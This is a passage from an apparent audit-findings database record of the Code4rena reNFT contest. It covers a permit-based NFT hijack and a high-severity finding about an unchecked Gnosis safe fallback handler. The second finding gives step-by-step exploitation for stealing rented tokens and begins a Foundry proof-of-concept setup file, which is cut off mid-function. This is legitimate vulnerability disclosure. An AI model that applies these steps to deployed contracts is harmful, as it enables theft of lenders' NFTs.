whitelist for tokens interacting with the protocol.\n\n**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/587#issuecomment-1912630065):**\n > While the permit functionality is not part of the specification for ERC 721 (nor ERC20) I don't think it would be reasonable to call this out of scope.  I do think that its a pre-condition for this attack and therefore might be better classified as M severity. Would welcome more conversation if the sponsor disagrees strongly, but think this is a valid issue that isn't a \"gotcha\" like some of the other odd ERC20 token exploits. \n\n**[Alec1017 (reNFT) acknowledged](https://github.com/code-423n4/2024-01-renft-findings/issues/587#issuecomment-1910740837)**\n\n_Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/587)._\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/11) - Introduces support for rented tokens that use Permit() for gasless approvals. The rental safe should now be able to prevent gasless signatures from approving rented assets.\n\n**Status:** Mitigation error. Full details in reports from [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/26) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/10), and also included in the [Mitigation Review](#mitigation-review) section below.\n\n***\n\n",
      "summary": "\nThis report describes a bug in the ERC721-Permit feature, which is used to add a new `permit()` function to the ERC721 standard. This function allows users to sign an ERC721 approve transaction off-chain and then submit it to the permit function, which will execute the approve function. This feature is meant to enable meta-transaction support for ERC721 transfers and prevent misuse and replay attacks.\n\nThe bug allows a malicious borrower to hijack an NFT token by producing a signature and feeding it to the `permit()` function, requesting it to approve their address to transfer the token. The steps to exploit this bug are outlined in the report, and a proof of concept is provided in the form of two files that need to be added to the test folder and a command that needs to be run.\n\nTo fix this bug, the report suggests adding checks for the `permit()` function in the ReNFT code. It also provides information on the contracts and policies that need to be deployed for the exploit to work.",
      "report_date": {},
      "contest_prize_txt": "83600",
      "contest_link": "https://code4rena.com/reports/2024-01-renft",
      "sponsor_name": "reNFT",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/587",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "317",
      "slug": "m-02-a-malicious-borrower-can-hijack-any-nft-with-permit-function-he-rents-code4rena-renft-renft-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "reNFT",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "reNFT",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "NFT Lending"
            },
            "score": 1391.208791137663
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "NFT"
          }
        },
        {
          "tags_tag": {
            "title": "ERC721"
          }
        }
      ]
    },
    {
      "id": "30522",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 15,
      "protocol_id": "1238",
      "title": "[H-02] An attacker is able to hijack any ERC721 / ERC1155 he borrows because guard is missing validation on the address supplied to function call `setFallbackHandler()`",
      "content": "\n### Pre-requisite knowledge & an overview of the features in question\n\n***\n\n1.  **Gnosis safe fallback handlers**: Safes starting with version 1.1.1 allow to specify a fallback handler. A gnosis safe fallback handler is a contract which handles all functions that is unknown to the safe, this feature is meant to provide a great flexibility for the safe user. The safe in particular says \"If I see something unknown, then I just let the fallback handler deal with it.\"\n\n    **Example**: If you want to take a uniswap flash loan using your gnosis safe, you'll have to create a fallback handler contract with the callback function `uniswapV2Call()`. When you decide to take a flash loan using your safe, you'll send a call to `swap()` in the uniswap contract. The uniswap contract will then reach out to your safe contract asking to call `uniswapV2Call()`, but `uniswapV2Call()` isn't actually implemented in the safe contract itself, so your safe will reach out to the fallback handler you created, set as the safe's fallback handler and ask it to handle the `uniswapV2Call()` TX coming from uniswap.\n\n    **Setting a fallback handler**: To set a fallback handler for your safe, you'll have to call the function [`setFallbackHandler()`](https://github.com/safe-global/safe-contracts/blob/b140318af6581e499506b11128a892e3f7a52aeb/contracts/base/FallbackManager.sol#L44) which you can find it's logic in [FallbackManager.sol](https://github.com/safe-global/safe-contracts/blob/main/contracts/base/FallbackManager.sol)\n\n2.  **Gnosis safe guards**: A gnosis guard is a contract that acts as a transaction guard which allows the owner of the safe to limit the contracts and functions that may be called by the multisig owners of the safe. ReNFT has created it's own gnosis guard contract, which is [Guard.sol](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Guard.sol).\n\n    **Example utility**: When you ask reNFT to create a rental safe for you by calling [deployRentalSafe()](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Factory.sol#L138) in [Factory.sol](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Factory.sol), reNFT creates a rental safe for you and automatically installs it's own guard contract on it. Everytime you send a call from your gnosis safe, this call has to first pass through that guard. If you're for example, trying to move a NFT token you rented using `transferFrom()`, it'll prevent you from doing so. When it intercepts the transaction you're trying to send, it checks for a [list of function signatures](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L195) that can be malicious, for example it checks if you're trying to enable/disable a module it has not authorized. It checks if you're trying to change the guard contract address itself, It also checks if you're trying to transfer or approve a rented NFT or ERC1155 token using the most common functions like `approve()`, `safeTransferFrom()`, `transferFrom()`, `setApprovalForAll()`. This guard acts as the single and most important defense line against rented ERC721/1155 token theft.\n\n***\n\n### The Vulnerability & Exploitation Steps\n\n***\n\nWhile the gnosis guard checks for a comprehensive list of potentially malicious function calls, it doesn't have any validation or checks for the `address` parameter of the function `setFallbackHandler(address handler)`, which is the function used by the rental safe owner to set a fallback handler his safe. This is super dangerous because it allows an attacker to hijack ANY ERC721 or ERC1155 token he rents by following these steps:\n\n1.  Sets the fallback handler address of the safe to be the address of the token he rented which he wants to hijack, let's say it's an ERC721 token.\n\n2.  Sends a `transferFrom(from, to, tokenId)` call to the gnosis safe contract while supplying the following parameters:\n    1.  `from` -> the address of the rental safe holding the token.\n    2.  `to` -> the address of the attacker himself.\n    3.  `tokenId` -> the ID of the token he wants to hijack.\n\n3.  The gnosis safe contract doesn't have the function `transferFrom()` implemented, so it'll [reach out and send a call to](https://github.com/safe-global/safe-contracts/blob/b140318af6581e499506b11128a892e3f7a52aeb/contracts/base/FallbackManager.sol#L78) the fallback handler address which is the address of the rented token contract and forward the calldata gnosis received from the attacker's call to the rented token contract.\n\n4.  Since it's the gnosis rental safe talking to the the rented token contract, and since the rental safe is the owner of the NFT, the ERC721 rented token contract will happily make the transfer and send the token to the attacker.\n\n5.  Token is hijacked, and the lender of the token won't be able to get it back or get the funds he's supposed to receive from the rental process.\n\n***\n\n### Proof of concept\n\n***\n\nTo run the PoC, you'll need to do the following:\n\n1.  You'll need to add the following two files to the test/ folder:\n    1.  `SetupExploit.sol` -> Sets up everything from seaport, gnosis, reNFT contracts\n    2.  `Exploit.sol` -> The actual exploit PoC which relies on `SetupExploit.sol` as a base.\n2.  You'll need to run this command\n    `forge test --match-contract Exploit --match-test test_ERC721_1155_Exploit -vvv`\n\n*Note: All of my 7 PoCs throughout my reports include the `SetupExploit.sol`. Please do not rely on the previous `SetupExploit.sol` file if you already had one in the tests/ folder. In some PoCs, there are slight modifications done in that file to properly set up the test infrastructure for the exploit*\n\n**The files:**\n\n<details>\n<summary><b>SetupExploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        ConsiderationItem,\n        OfferItem,\n        OrderParameters,\n        OrderComponents,\n        Order,\n        AdvancedOrder,\n        ItemType,\n        ItemType as SeaportItemType,\n        CriteriaResolver,\n        OrderType as SeaportOrderType,\n        Fulfillment,\n        FulfillmentComponent\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n    import {\n        AdvancedOrderLib,\n        ConsiderationItemLib,\n        FulfillmentComponentLib,\n        FulfillmentLib,\n        OfferItemLib,\n        OrderComponentsLib,\n        OrderLib,\n        OrderParametersLib,\n        SeaportArrays,\n        ZoneParametersLib\n    } from \"@seaport-sol/SeaportSol.sol\";\n\n    import {\n        OrderMetadata,\n        OrderType,\n        OrderFulfillment,\n        RentPayload,\n        RentalOrder,\n        Item,\n        SettleTo,\n        ItemType as RentalItemType\n    } from \"@src/libraries/RentalStructs.sol\";\n\n    import {ECDSA} from \"@openzeppelin-contracts/utils/cryptography/ECDSA.sol\";\n    import {OrderMetadata, OrderType, Hook} from \"@src/libraries/RentalStructs.sol\";\n    import {Vm} from \"@forge-std/Vm.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {LibString} from \"@solady/utils/LibString.sol\";\n    import {SafeL2} from \"@safe-contracts/SafeL2.sol\";\n    import {BaseExternal} from \"@test/fixtures/external/BaseExternal.sol\";\n    import {Create2Deployer} from \"@src/Create2Deployer.sol\";\n    import {Kernel, Actions} from \"@src/Kernel.sol\";\n    import {Storage} from \"@src/modules/Storage.sol\";\n    import {PaymentEscrow} from \"@src/modules/PaymentEscrow.sol\";\n    import {Create} from \"@src/policies/Create.sol\";\n    import {Stop} from \"@src/policies/Stop.sol\";\n    import {Factory} from \"@src/policies/Factory.sol\";\n    import {Admin} from \"@src/policies/Admin.sol\";\n    import {Guard} from \"@src/policies/Guard.sol\";\n    import {toRole} from \"@src/libraries/KernelUtils.sol\";\n    import {Proxy} from \"@src/proxy/Proxy.sol\";\n    import {Events} from \"@src/libraries/Events.sol\";\n\n    import {ProtocolAccount} from \"@test/utils/Types.sol\";\n    import {MockERC20} from \"@test/mocks/tokens/standard/MockERC20.sol\";\n    import {MockERC721} from \"@test/mocks/tokens/standard/MockERC721.sol\";\n    import {MockERC1155} from \"@test/mocks/tokens/standard/MockERC1155.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n    import {ISafe} from \"@src/interfaces/ISafe.sol\";\n\n\n    // Deploys all V3 protocol contracts\n    contract Protocol is BaseExternal {\n        // Kernel\n        Kernel public kernel;\n\n        // Modules\n        Storage public STORE;\n        PaymentEscrow public ESCRW;\n\n        // Module implementation addresses\n        Storage public storageImplementation;\n        PaymentEscrow public paymentEscrowImplementation;\n\n        // Policies\n        Create public create;\n        Stop public stop;\n        Factory public factory;\n        Admin public admin;\n        Guard public guard;\n\n        // Protocol accounts\n        Vm.Wallet public rentalSigner;\n        Vm.Wallet public deployer;\n\n        // protocol constants\n        bytes12 public protocolVersion;\n        bytes32 public salt;\n\n        function _deployKernel() internal {\n            // abi encode the kernel bytecode and constructor arguments\n            bytes memory kernelInitCode = abi.encodePacked(\n                type(Kernel).creationCode,\n                abi.encode(deployer.addr, deployer.addr)\n            );\n\n            // Deploy kernel contract\n            vm.prank(deployer.addr);\n            kernel = Kernel(create2Deployer.deploy(salt, kernelInitCode));\n\n            // label the contract\n            vm.label(address(kernel), \"kernel\");\n        }\n\n        function _deployStorageModule() internal {\n            // abi encode the storage bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory storageImplementationInitCode = abi.encodePacked(\n                type(Storage).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy storage implementation contract\n            vm.prank(deployer.addr);\n            storageImplementation = Storage(\n                create2Deployer.deploy(salt, storageImplementationInitCode)\n            );\n\n            // abi encode the storage bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory storageProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(storageImplementation),\n                    abi.encodeWithSelector(\n                        Storage.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy storage proxy contract\n            vm.prank(deployer.addr);\n            STORE = Storage(create2Deployer.deploy(salt, storageProxyInitCode));\n\n            // label the contracts\n            vm.label(address(STORE), \"STORE\");\n            vm.label(address(storageImplementation), \"STORE_IMPLEMENTATION\");\n        }\n\n        function _deployPaymentEscrowModule() internal {\n            // abi encode the payment escrow bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory paymentEscrowImplementationInitCode = abi.encodePacked(\n                type(PaymentEscrow).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy payment escrow implementation contract\n            vm.prank(deployer.addr);\n            paymentEscrowImplementation = PaymentEscrow(\n                create2Deployer.deploy(salt, paymentEscrowImplementationInitCode)\n            );\n\n            // abi encode the payment escrow bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory paymentEscrowProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(paymentEscrowImplementation),\n                    abi.encodeWithSelector(\n                        PaymentEscrow.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy payment escrow contract\n            vm.prank(deployer.addr);\n            ESCRW = PaymentEscrow(create2Deployer.deploy(salt, paymentEscrowProxyInitCode));\n\n            // label the contracts\n            vm.label(address(ESCRW), \"ESCRW\");\n            vm.label(address(paymentEscrowImplementation), \"ESCRW_IMPLEMENTATION\");\n        }\n\n        function _deployCreatePolicy() internal {\n            // abi encode the create policy bytecode and constructor arguments\n            bytes memory createInitCode = abi.encodePacked(\n                type(Create).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy create rental policy contract\n            vm.prank(deployer.addr);\n            create = Create(create2Deployer.deploy(salt, createInitCode));\n\n            // label the contract\n            vm.label(address(create), \"CreatePolicy\");\n        }\n\n        function _deployStopPolicy() internal {\n            // abi encode the stop policy bytecode and constructor arguments\n            bytes memory stopInitCode = abi.encodePacked(\n                type(Stop).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy stop rental policy contract\n            vm.prank(deployer.addr);\n            stop = Stop(create2Deployer.deploy(salt, stopInitCode));\n\n            // label the contract\n            vm.label(address(stop), \"StopPolicy\");\n        }\n\n        function _deployAdminPolicy() internal {\n            // abi encode the admin policy bytecode and constructor arguments\n            bytes memory adminInitCode = abi.encodePacked(\n                type(Admin).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy admin policy contract\n            vm.prank(deployer.addr);\n            admin = Admin(create2Deployer.deploy(salt, adminInitCode));\n\n            // label the contract\n            vm.label(address(admin), \"AdminPolicy\");\n        }\n\n        function _deployGuardPolicy() internal {\n            // abi encode the guard policy bytecode and constructor arguments\n            bytes memory guardInitCode = abi.encodePacked(\n                type(Guard).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy guard policy contract\n            vm.prank(deployer.addr);\n            guard = Guard(create2Deployer.deploy(salt, guardInitCode));\n\n            // label the contract\n            vm.label(address(guard), \"GuardPolicy\");\n        }\n\n        function _deployFactoryPolicy() internal {\n            // abi encode the factory policy bytecode and constructor arguments\n            bytes memory factoryInitCode = abi.encodePacked(\n                type(Factory).creationCode,\n                abi.encode(\n                    address(kernel),\n                    address(stop),\n                    address(guard),\n                    address(tokenCallbackHandler),\n                    address(safeProxyFactory),\n                    address(safeSingleton)\n                )\n            );\n\n            // Deploy factory policy contract\n            vm.prank(deployer.addr);\n            factory = Factory(create2Deployer.deploy(salt, factoryInitCode));\n\n            // label the contract\n            vm.label(address(factory), \"FactoryPolicy\");\n        }\n\n        function _setupKernel() internal {\n            // Start impersonating the deployer\n            vm.startPrank(deployer.addr);\n\n            // Install modules\n            kernel.executeAction(Actions.InstallModule, address(STORE));\n            kernel.executeAction(Actions.InstallModule, address(ESCRW));\n\n            // Approve policies\n            kernel.executeAction(Actions.ActivatePolicy, address(create));\n            kernel.executeAction(Actions.ActivatePolicy, address(stop));\n            kernel.executeAction(Actions.ActivatePolicy, address(factory));\n            kernel.executeAction(Actions.ActivatePolicy, address(guard));\n            kernel.executeAction(Actions.ActivatePolicy, address(admin));\n\n            // Grant `seaport` role to seaport protocol\n            kernel.grantRole(toRole(\"SEAPORT\"), address(seaport));\n\n            // Grant `signer` role to the protocol signer to sign off on create payloads\n            kernel.grantRole(toRole(\"CREATE_SIGNER\"), rentalSigner.addr);\n\n            // Grant 'admin_admin` role to the address which can conduct admin operations on the protocol\n            kernel.grantRole(toRole(\"ADMIN_ADMIN\"), deployer.addr);\n\n            // Grant 'guard_admin` role to the address which can toggle hooks\n            kernel.grantRole(toRole(\"GUARD_ADMIN\"), deployer.addr);\n\n            // Grant `stop_admin` role to the address which can skim funds from the payment escrow\n            kernel.grantRole(toRole(\"STOP_ADMIN\"), deployer.addr);\n\n            // Stop impersonating the deployer\n            vm.stopPrank();\n        }\n\n        function setUp() public virtual override {\n            // setup dependencies\n            super.setUp();\n\n            // create the rental signer address and private key\n            rentalSigner = vm.createWallet(\"rentalSigner\");\n\n            // create the deployer address and private key\n            deployer = vm.createWallet(\"deployer\");\n\n            // contract salts (using 0x000000000000000000000100 to represent a version 1.0.0 of each contract)\n            protocolVersion = 0x000000000000000000000100;\n            salt = create2Deployer.generateSaltWithSender(deployer.addr, protocolVersion);\n\n            // deploy kernel\n            _deployKernel();\n\n            // Deploy payment escrow\n            _deployPaymentEscrowModule();\n\n            // Deploy rental storage\n            _deployStorageModule();\n\n            // deploy create policy\n            _deployCreatePolicy();\n\n            // deploy stop policy\n            _deployStopPolicy();\n\n            // deploy admin policy\n            _deployAdminPolicy();\n\n            // Deploy guard policy\n            _deployGuardPolicy();\n\n            // deploy rental factory\n            _deployFactoryPolicy();\n\n            // intialize the kernel\n            _setupKernel();\n        }\n    }\n\n\n    // Creates test accounts to interact with the V3 protocol\n    // Borrowed from test/fixtures/protocol/AccountCreator\n    contract AccountCreator is Protocol {\n        // Protocol accounts for testing\n        ProtocolAccount public alice;\n        ProtocolAccount public bob;\n        ProtocolAccount public carol;\n        ProtocolAccount public dan;\n        ProtocolAccount public eve;\n        ProtocolAccount public attacker;\n\n        // Mock tokens for testing\n        MockERC20[] public erc20s;\n        MockERC721[] public erc721s;\n        MockERC1155[] public erc1155s;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // deploy 3 erc20 tokens, 3 erc721 tokens, and 3 erc1155 tokens\n            _deployTokens(3);\n\n            // instantiate all wallets and deploy rental safes for each\n            alice = _fundWalletAndDeployRentalSafe(\"alice\");\n            bob = _fundWalletAndDeployRentalSafe(\"bob\");\n            carol = _fundWalletAndDeployRentalSafe(\"carol\");\n            dan = _fundWalletAndDeployRentalSafe(\"dan\");\n            eve = _fundWalletAndDeployRentalSafe(\"eve\");\n            attacker = _fundWalletAndDeployRentalSafe(\"attacker\");\n\n\n\n        }\n\n        function _deployTokens(uint256 numTokens) internal {\n            for (uint256 i; i < numTokens; i++) {\n                _deployErc20Token();\n                _deployErc721Token();\n                _deployErc1155Token();\n            }\n        }\n\n        function _deployErc20Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc20s.length;\n\n            // deploy the mock token\n            MockERC20 token = new MockERC20();\n\n            // push the token to the array of mocks\n            erc20s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC20_\", LibString.toString(i)));\n        }\n\n        function _deployErc721Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc721s.length;\n\n            // deploy the mock token\n            MockERC721 token = new MockERC721();\n\n            // push the token to the array of mocks\n            erc721s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC721_\", LibString.toString(i)));\n        }\n\n        function _deployErc1155Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc1155s.length;\n\n            // deploy the mock token\n            MockERC1155 token = new MockERC1155();\n\n            // push the token to the array of mocks\n            erc1155s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC1155_\", LibString.toString(i)));\n        }\n\n        function _deployRentalSafe(\n            address owner,\n            string memory name\n        ) internal returns (address safe) {\n            // Deploy a 1/1 rental safe\n            address[] memory owners = new address[](1);\n            owners[0] = owner;\n            safe = factory.deployRentalSafe(owners, 1);\n\n\n\n        }\n\n        function _fundWalletAndDeployRentalSafe(\n            string memory name\n        ) internal returns (ProtocolAccount memory account) {\n            // create a wallet with a address, public key, and private key\n            Vm.Wallet memory wallet = vm.createWallet(name);\n\n            // deploy a rental safe for the address\n            address rentalSafe = _deployRentalSafe(wallet.addr, name);\n\n            // fund the wallet with ether, all erc20s, and approve the conduit for erc20s, erc721s, erc1155s\n            _allocateTokensAndApprovals(wallet.addr, 10000);\n\n            // create an account\n            account = ProtocolAccount({\n                addr: wallet.addr,\n                safe: SafeL2(payable(rentalSafe)),\n                publicKeyX: wallet.publicKeyX,\n                publicKeyY: wallet.publicKeyY,\n                privateKey: wallet.privateKey\n            });\n\n        }\n\n        function _allocateTokensAndApprovals(address to, uint128 amount) internal {\n            // deal ether to the recipient\n            vm.deal(to, amount);\n\n            // mint all erc20 tokens to the recipient\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].mint(to, amount);\n            }\n\n            // set token approvals\n            _setApprovals(to);\n        }\n\n        function _setApprovals(address owner) internal {\n            // impersonate the owner address\n            vm.startPrank(owner);\n\n            // set all approvals for erc20 tokens\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].approve(address(conduit), type(uint256).max);\n            }\n\n            // set all approvals for erc721 tokens\n            for (uint256 i = 0; i < erc721s.length; ++i) {\n                erc721s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // set all approvals for erc1155 tokens\n            for (uint256 i = 0; i < erc1155s.length; ++i) {\n                erc1155s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // stop impersonating\n            vm.stopPrank();\n        }\n    }\n\n\n\n    interface ERC1155TokenReceiver {\n\n        function onERC1155Received(\n            address _operator,\n            address _from,\n            uint256 _id,\n            uint256 _value,\n            bytes calldata _data\n        ) external returns (bytes4);\n\n        function onERC1155BatchReceived(\n            address _operator,\n            address _from,\n            uint256[] calldata _ids,\n            uint256[] calldata _values,\n            bytes calldata _data\n        ) external returns (bytes4);\n    }\n\n    interface ERC721TokenReceiver {\n        function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata _data) external returns (bytes4);\n    }\n\n    interface IERC165 {\n        function supportsInterface(bytes4 interfaceId) external view returns (bool);\n    }\n\n\n    /**\n    * Borrowed from gnosis safe smart contracts\n    * @title Default Callback Handler - Handles supported tokens' callbacks, allowing Safes receiving these tokens.\n    * @author Richard Meissner - @rmeissner\n    */\n    contract TokenCallbackHandler is ERC1155TokenReceiver, ERC721TokenReceiver, IERC165 {\n        /**\n        * @notice Handles ERC1155 Token callback.\n        * return Standardized onERC1155Received return value.\n        */\n        function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure override returns (bytes4) {\n            return 0xf23a6e61;\n        }\n\n        /**\n        * @notice Handles ERC1155 Token batch callback.\n        * return Standardized onERC1155BatchReceived return value.\n        */\n        function onERC1155BatchReceived(\n            address,\n            address,\n            uint256[] calldata,\n            uint256[] calldata,\n            bytes calldata\n        ) external pure override returns (bytes4) {\n            return 0xbc197c81;\n        }\n\n        /**\n        * @notice Handles ERC721 Token callback.\n        *  return Standardized onERC721Received return value.\n        */\n        function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {\n            return 0x150b7a02;\n        }\n\n        /**\n        * @notice Handles ERC777 Token callback.\n        * return nothing (not standardized)\n        */\n        function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external pure {\n            // We implement this for completeness, doesn't really have any value\n        }\n\n        /**\n        * @notice Implements ERC165 interface support for ERC1155TokenReceiver, ERC721TokenReceiver and IERC165.\n        * @param interfaceId Id of the interface.\n        * @return if the interface is supported.\n        */\n        function supportsInterface(bytes4 interfaceId) external view virtual override returns (bool) {\n            return\n                interfaceId == type(ERC1155TokenReceiver).interfaceId ||\n                interfaceId == type(ERC721TokenReceiver).interfaceId ||\n                interfaceId == type(IERC165).interfaceId;\n        }\n\n    }\n\n\n\n    // Sets up logic in the test engine related to order creation\n    // Borrowed from test/fixtures/engine/OrderCreator\n    contract OrderCreator is AccountCreator {\n        using OfferItemLib for OfferItem;\n        using ConsiderationItemLib for ConsiderationItem;\n        using OrderComponentsLib for OrderComponents;\n        using OrderLib for Order;\n        using ECDSA for bytes32;\n\n        // defines a config for a standard order component\n        string constant STANDARD_ORDER_COMPONENTS = \"standard_order_components\";\n\n        struct OrderToCreate {\n            ProtocolAccount offerer;\n            OfferItem[] offerItems;\n            ConsiderationItem[] considerationItems;\n            OrderMetadata metadata;\n        }\n\n        // keeps track of tokens used during a test\n        uint256[] usedOfferERC721s;\n        uint256[] usedOfferERC1155s;\n\n        uint256[] usedConsiderationERC721s;\n        uint256[] usedConsiderationERC1155s;\n\n        // components of an order\n        OrderToCreate orderToCreate;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // Define a standard OrderComponents struct which is ready for\n            // use with the Create Policy and the protocol conduit contract\n            OrderComponentsLib\n                .empty()\n                .withOrderType(SeaportOrderType.FULL_RESTRICTED)\n                .withZone(address(create))\n                .withStartTime(block.timestamp)\n                .withEndTime(block.timestamp + 100)\n                .withSalt(123456789)\n                .withConduitKey(conduitKey)\n                .saveDefault(STANDARD_ORDER_COMPONENTS);\n\n            // for each test token, create a storage slot\n            for (uint256 i = 0; i < erc721s.length; i++) {\n                usedOfferERC721s.push();\n                usedConsiderationERC721s.push();\n\n                usedOfferERC1155s.push();\n                usedConsiderationERC1155s.push();\n            }\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                                Order Creation                               //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order based on the provided context. The defaults on this order\n        // are good for most test cases.\n        function createOrder(\n            ProtocolAccount memory offerer,\n            OrderType orderType,\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers,\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) internal {\n            // require that the number of offer items or consideration items\n            // dont exceed the number of test tokens\n            require(\n                erc721Offers <= erc721s.length &&\n                    erc721Offers <= erc1155s.length &&\n                    erc20Offers <= erc20s.length,\n                \"TEST: too many offer items defined\"\n            );\n            require(\n                erc721Considerations <= erc721s.length &&\n                    erc1155Considerations <= erc1155s.length &&\n                    erc20Considerations <= erc20s.length,\n                \"TEST: too many consideration items defined\"\n            );\n\n            // create the offerer\n            _createOfferer(offerer);\n\n            // add the offer items\n            _createOfferItems(erc721Offers, erc1155Offers, erc20Offers);\n\n            // create the consideration items\n            _createConsiderationItems(\n                erc721Considerations,\n                erc1155Considerations,\n                erc20Considerations\n            );\n\n            // Create order metadata\n            _createOrderMetadata(orderType);\n        }\n\n        // Creates an offerer on the order to create\n        function _createOfferer(ProtocolAccount memory offerer) private {\n            orderToCreate.offerer = offerer;\n        }\n\n        // Creates offer items which are good for most tests\n        function _createOfferItems(\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers\n        ) private {\n            // generate the ERC721 offer items\n            for (uint256 i = 0; i < erc721Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(erc721s[i]))\n                        .withIdentifierOrCriteria(usedOfferERC721s[i])\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n                );\n\n                // mint an erc721 to the offerer\n                erc721s[i].mint(orderToCreate.offerer.addr);\n\n                // update the used token so it cannot be used again in the same test\n                usedOfferERC721s[i]++;\n            }\n\n            // generate the ERC1155 offer items\n            for (uint256 i = 0; i < erc1155Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(erc1155s[i]))\n                        .withIdentifierOrCriteria(usedOfferERC1155s[i])\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n\n                // mint an erc1155 to the offerer\n                erc1155s[i].mint(orderToCreate.offerer.addr, 100);\n\n                // update the used token so it cannot be used again in the same test\n                usedOfferERC1155s[i]++;\n            }\n\n            // generate the ERC20 offer items\n            for (uint256 i = 0; i < erc20Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC20)\n                        .withToken(address(erc20s[i]))\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n            }\n        }\n\n        // Creates consideration items that are good for most tests\n        function _createConsiderationItems(\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) private {\n            // generate the ERC721 consideration items\n            for (uint256 i = 0; i < erc721Considerations; ++i) {\n                // create the consideration item, and set the recipient as the offerer's\n                // rental safe address\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(orderToCreate.offerer.safe))\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(erc721s[i]))\n                        .withIdentifierOrCriteria(usedConsiderationERC721s[i])\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n                );\n\n                // update the used token so it cannot be used again in the same test\n                usedConsiderationERC721s[i]++;\n            }\n\n            // generate the ERC1155 consideration items\n            for (uint256 i = 0; i < erc1155Considerations; ++i) {\n                // create the consideration item, and set the recipient as the offerer's\n                // rental safe address\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(orderToCreate.offerer.safe))\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(erc1155s[i]))\n                        .withIdentifierOrCriteria(usedConsiderationERC1155s[i])\n                        